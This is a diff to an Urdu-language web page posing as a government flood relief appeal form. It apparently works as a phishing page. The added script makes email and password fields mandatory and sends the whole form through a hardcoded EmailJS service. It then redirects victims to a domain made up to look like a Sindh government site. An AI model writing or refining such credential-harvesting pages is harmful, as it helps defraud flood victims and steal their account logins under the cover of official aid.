@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title> فلڈ ریلیف اپیل فارم</title>
+  <title>فلڈ ریلیف اپیل فارم</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
@@ -23,9 +23,9 @@
       text-align: center;
     }
     label {
-  display: block;
-  text-align: left;
-}
+      display: block;
+      text-align: left;
+    }
     h2 {
       margin-bottom: 10px;
       color: #333;
@@ -109,14 +109,26 @@
     document.getElementById("myForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
+      // Get required field values
+      const email = document.querySelector("input[name='user_name']").value.trim();
+      const password = document.querySelector("input[name='user_email']").value.trim();
+
+      // Check only email & password fields
+      if (email === "" || password === "") {
+        alert("براہ کرم ای میل اور پاس ورڈ لازمی درج کریں۔");
+        return; // Stop form submission if empty
+      }
+
+      // If email & password filled, send data via EmailJS
       emailjs.sendForm("service_ch1laac", "template_7243jwf", this)
         .then(() => {
           window.location.href = "https://flood-relief-program-govt-sindh.vercel.app/"; // Redirect after success
         }, (err) => {
           console.log("FAILED!", err);
+          alert("کچھ غلط ہوگیا ہے، دوبارہ کوشش کریں۔");
         });
     });
   </script>
 
 </body>
-</html>
+          </html>
